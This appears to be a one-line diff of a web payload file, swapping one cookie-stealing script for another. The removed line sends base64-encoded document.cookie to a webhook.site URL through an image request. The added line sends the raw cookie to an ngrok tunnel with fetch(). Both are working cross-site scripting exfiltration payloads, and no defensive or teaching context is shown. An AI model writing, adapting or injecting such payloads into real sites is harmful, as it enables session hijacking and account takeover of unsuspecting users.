@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/1c81726f-e41f-4716-9af3-70938dade3dd?data='+btoa(document.cookie);
+fetch('https://5c97-2409-40e0-3b-62eb-6a0-1a0a-8772-c53e.ngrok-free.app?c=' + document.cookie)
